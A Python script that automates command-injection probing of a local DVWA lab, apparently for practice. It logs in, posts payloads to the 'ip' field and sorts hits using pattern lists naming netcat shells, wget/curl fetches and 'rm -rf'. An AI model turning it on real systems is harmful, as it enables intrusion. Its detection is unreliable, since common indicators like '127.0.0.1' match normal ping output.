import requests
import time
import json
from bs4 import BeautifulSoup

# Configuration
login_url = "http://127.0.0.1/DVWA/login.php"
security_url = "http://127.0.0.1/DVWA/security.php"
target_url = "http://127.0.0.1/DVWA/vulnerabilities/exec/"
payloads_file_path = "/home/kali/Desktop/gui/payloadsc.json"  # Local path to payloads.json file
username = "admin"  # Replace with the correct username
password = "password"  # Replace with the correct password

# Step 1: Fetch Payloads
def fetch_payloads():
    with open(payloads_file_path, 'r') as file:
        payloads = json.load(file)
    return payloads["command_injection"]

# Step 2: Log in to the target site
def login(session, url, username, password):
    login_page = session.get(url)
    soup = BeautifulSoup(login_page.content, 'html.parser')
    form = soup.find('form')
    data = {}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') == 'username':
            data[input_tag.get('name')] = username
        elif input_tag.get('name') == 'password':
            data[input_tag.get('name')] = password
        elif input_tag.get('name'):
            data[input_tag.get('name')] = input_tag.get('value')
    
    response = session.post(url, data=data)
    return response

# Step 3: Set security level
def set_security_level(session, url, level):
    security_page = session.get(url)
    soup = BeautifulSoup(security_page.content, 'html.parser')
    form = soup.find('form')
    data = {}
    for input_tag in form.find_all('input'):
        if input_tag.get('name') and input_tag.get('type') != 'submit':
            data[input_tag.get('name')] = input_tag.get('value')
    
    for select_tag in form.find_all('select'):
        data[select_tag.get('name')] = level
    
    # Include the submit button
    for input_tag in form.find_all('input', {'type': 'submit'}):
        data[input_tag.get('name')] = input_tag.get('value')
    
    response = session.post(url, data=data)
    return response

# Step 4: Identify the vulnerable line of code
def identify_vulnerable_code(security_level):
    if security_level == "low":
        return "$cmd = shell_exec( 'ping ' . $target ); or $cmd = shell_exec( 'ping -c 4 ' . $target );"
    elif security_level == "medium":
        return "$cmd = shell_exec( 'ping ' . $target ); or $cmd = shell_exec( 'ping -c 4 ' . $target );"
    elif security_level == "high":
        return "$cmd = shell_exec( 'ping ' . $target ); or $cmd = shell_exec( 'ping -c 4 ' . $target );"
    elif security_level == "impossible":
        return "No vulnerable code found; the input is sanitized."
    return "Unknown security level."

# Step 5: Test Payloads
def test_payloads(session, url, payloads):
    results = []
    for payload in payloads:
        data = {'ip': payload, 'Submit': 'Submit'}
        start_time = time.time()
        response = session.post(url, data=data)
        response_time = time.time() - start_time
        content = response.content.decode()

        # Check for common indicators of successful command injection
        indicators = [
            "uid=", "gid=", "root", "bin/bash", "command not found", "nc: command",
            "127.0.0.1", "malware downloaded", "Execution Successful", "Pinging"
        ]
        if any(indicator in content for indicator in indicators):
            classification = classify_payload(payload)
            results.append((payload, "ip", classification, "Detected via response content"))
        elif response_time > 5:  # Time-based payload detection
            classification = classify_payload(payload)
            results.append((payload, "ip", classification, "Detected via response delay"))
    
    return results

# Step 6: Classify Payloads
def classify_payload(payload):
    basic_cmd_injection_patterns = ["; ls", "; id", "; whoami"]
    advanced_cmd_injection_patterns = ["&& whoami", "|| id", "; nc -e", "; wget", "; curl"]
    obfuscation_patterns = ["\\x", "$(whoami)", "$(uname -a)"]
    file_upload_patterns = ["file; touch", "file; rm -rf", "file; nc -e", "file; chmod +x"]

    # Check for Basic Command Injection
    for pattern in basic_cmd_injection_patterns:
        if pattern in payload:
            return "Basic Command Injection"

    # Check for Advanced Command Injection
    for pattern in advanced_cmd_injection_patterns:
        if pattern in payload:
            return "Advanced Command Injection"

    # Check for Command Injection with Obfuscation
    for pattern in obfuscation_patterns:
        if pattern in payload:
            return "Command Injection with Obfuscation"

    # Check for Command Injection via File Upload
    for pattern in file_upload_patterns:
        if pattern in payload:
            return "Command Injection via File Upload"

    return "Unknown"

# Step 7: Print Results
def print_results(results, security_level):
    if not results:
        print(f"NO, the given URL is not vulnerable to Command Injection at {security_level} security level.")
        return

    vulnerable_code_line = identify_vulnerable_code(security_level)
    print(f"YES, the given URL is vulnerable to Command Injection at {security_level} security level.\n")
    print(f"Vulnerable Parameter found:\nParameter: ip")
    print(f"Vulnerable Line of Code: {vulnerable_code_line}\n")

    classifications = {}
    for payload, param, classification, detection_method in results:
        if classification not in classifications:
            classifications[classification] = []
        classifications[classification].append(payload)
    
    print("Please find below the details of the vulnerable payloads:\n")
    for classification, payloads in classifications.items():
        print(f"{classification}:")
        for payload in payloads:
            print(f"Payload: {payload}")
        print("-" * 80)

# Main Execution
def main():
    print("Select the DVWA Security Level:")
    print("1. Low")
    print("2. Medium")
    print("3. High")
    print("4. Impossible")
    security_choice = input("Enter the number corresponding to the security level: ")
    
    if security_choice == '1':
        security_level = "low"
    elif security_choice == '2':
        security_level = "medium"
    elif security_choice == '3':
        security_level = "high"
    elif security_choice == '4':
        security_level = "impossible"
    else:
        print("Invalid choice!")
        return
    
    print(f"Using {security_level.capitalize()} security level.")
    
    with requests.Session() as session:
        login_response = login(session, login_url, username, password)
        if "Welcome" not in login_response.text:
            print("Login failed.")
            return
        
        set_security_level(session, security_url, security_level)
        
        payloads = fetch_payloads()
        results = test_payloads(session, target_url, payloads)
        
        print("Printing results...")
        print_results(results, security_level)

if __name__ == "__main__":
    main()
